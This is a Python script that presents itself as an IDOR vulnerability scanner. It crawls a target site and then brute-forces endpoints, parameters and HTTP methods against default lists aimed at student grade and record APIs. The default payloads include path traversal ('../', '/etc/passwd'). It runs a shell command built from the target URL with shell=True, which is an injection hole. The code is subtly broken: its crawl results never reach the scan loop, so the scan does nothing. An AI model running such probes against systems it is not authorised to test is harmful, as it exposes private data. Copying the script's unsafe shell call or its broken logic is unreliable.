import os
import sys
import subprocess
import argparse
import requests
import urllib.parse
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from colorama import Fore, Back, Style

red = Fore.RED + Style.BRIGHT
green = Fore.GREEN + Style.BRIGHT
yellow = Fore.YELLOW + Style.BRIGHT
blue = Fore.BLUE + Style.BRIGHT
purple = Fore.MAGENTA + Style.BRIGHT
cyan = Fore.CYAN + Style.BRIGHT
white = Fore.WHITE + Style.BRIGHT
no_colour = Fore.RESET + Back.RESET + Style.RESET_ALL

ask = green + "[" + white + "?" + green + "] " + blue
success = yellow + "[" + white + "√" + yellow + "] " + green
error = blue + "[" + white + "!" + blue + "] " + red
info = yellow + "[" + white + "+" + yellow + "] " + cyan
info2 = green + "[" + white + "•" + green + "] " + purple

target_url = ""
base_url = ""
start_url = ""

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Accept": "application/json"
}

http_methods = ["GET", "POST", "PUT", "DELETE"]

visited_urls = set()

def load_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print(error + f"File not found: {file_path}")
        return []
# while running default crawl it gives the error: "Some characters could not be decoded, and were replaced with REPLACEMENT CHARACTER."
# def crawl(url, base_url):
#     visited_urls.add(url)
#     response = requests.get(url, headers=headers)
#     soup = BeautifulSoup(response.content, "html.parser")

#     # Extract all links from the current page
#     for link in soup.find_all("a"):
#         href = link.get("href")
#         if href and href.startswith(base_url) and href not in visited_urls:
#             crawl(href, base_url)
def crawl(url, base_url):
    url_name=base_url
    katana_output_file = f"{url_name.replace('https://', '').replace('http://', '')}_katana"

    katana_cmd = f"katana -u {url_name} -output {katana_output_file}"
    subprocess.run(katana_cmd, shell=True, check=True)

    with open(katana_output_file, 'r') as f:
        visited_urls = [line.strip() for line in f.readlines() if line.startswith(base_url)]


def test_request(url, method):
    try:
        response = requests.request(method, url, headers=headers)
        return response.status_code, response.text
    except requests.RequestException as e:
        return None, str(e)

def analyze_response(url, method, status_code, response_text):
    if status_code == 200:
        print(success + f"Potential IDOR vulnerability found for URL: {url} | Method: {method} | Status Code: {status_code}")

        for sensitive_endpoint in sensitive_endpoints:
            sensitive_url = urljoin(base_url, sensitive_endpoint)
            sensitive_status_code, sensitive_response_text = test_request(sensitive_url, "GET")

            if sensitive_status_code == 200:
                print(success + f"Sensitive data accessed at endpoint: {sensitive_endpoint} | URL: {sensitive_url}")
            else:
                print(error + f"No sensitive data accessed at endpoint: {sensitive_endpoint}")
    else:
        print(error + f"No IDOR vulnerability found for URL: {url} | Method: {method} | Status Code: {status_code}")

def main():
    parser = argparse.ArgumentParser(description="IDOR Vulnerability Scanner")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-e", "--endpoints", help="Path to file containing endpoints")
    parser.add_argument("-s", "--sensitive-endpoints", help="Path to file containing sensitive endpoints")
    parser.add_argument("-p", "--parameters", help="Path to file containing parameters")
    parser.add_argument("-t", "--test-values", help="Path to file containing test values")
    parser.add_argument("-l", "--payloads", help="Path to file containing payloads")
    args = parser.parse_args()

    global target_url, base_url, start_url, endpoints, parameters, sensitive_endpoints, test_values, payloads

    target_url = args.url
    parsed_url = urllib.parse.urlparse(args.url)
    netloc = parsed_url.netloc
    
    if netloc:
        base_url = f"{parsed_url.scheme}://{netloc}"
    else:
        base_url = parsed_url
    start_url = base_url + "/"

    print("tartarget url:" ,target_url)
    print("base url: ", base_url)
    
    
    if args.endpoints:
        endpoints = load_from_file(args.endpoints)
    else:
        endpoints = [
            "/myaccount/uid=12",
            "User/Login",
            "/photos/002548",
            "/item/193422",
            "/app/accountInfo?acct=admin",
            "/transaction.php?id=74656",
            "/change_password.php?userid=1701",
            "/display_file.php?file.txt",
            "/balance?acc=123",
            "/changepassword?user=someuser",
            "/showImage?img=img00011",
            "/accessPage?menuitem=12",
            "/accountInfo/accId=2",
            "/testpage?invoiceId=12345",
            "/app/accountInfo?act=requestor"
        ]

    if args.parameters:
        parameters = load_from_file(args.parameters)
    else:
        parameters = [
            "use", "id", "userid", "username", "user", "blog", "post", "info", "profile", "obj", "object", "query",
            "create", "delete", "edit", "retrieve", "get", "put", "patch", "del", ":id"
        ]

    if args.sensitive_endpoints:
        sensitive_endpoints = load_from_file(args.sensitive_endpoints)
    else:
        sensitive_endpoints = [
            "/api/grades",
            "/api/student_info",
            "/api/attendance",
            "/api/exam_results"
        ]

    if args.test_values:
        test_values = load_from_file(args.test_values)
    else:
        test_values = ["1", "2", "3", "4"]

    if args.payloads:
        payloads = load_from_file(args.payloads)
    else:
        payloads = ["../", "/etc/passwd", "admin"]

    # Start crawling and spidering from the initial URL
    crawl(start_url, base_url)

    # Make requests with different parameter values, payloads, methods, headers, and analyze the responses
    for url in visited_urls:
        for endpoint in endpoints:
            for parameter in parameters:
                for value in test_values + payloads:
                    for method in http_methods:
                        # Craft the request URL with the modified endpoint and parameter value
                        url_with_param = urljoin(url, endpoint) + "?" + parameter + "=" + value
                        status_code, response_text = test_request(url_with_param, method)
                        analyze_response(url_with_param, method, status_code, response_text)

if __name__ == '__main__':
    try:
        os.system("clear")
        if len(sys.argv) == 1:
            print("Usage: python script.py -u <target_url> [-e <endpoints_file>] [-s <sensitive_endpoints_file>] [-p <parameters_file>] [-t <test_values_file>] [-l <payloads_file>]")
        else:
            main()
    except KeyboardInterrupt:
        print(error + "You Pressed Ctrl + C Goodbye!")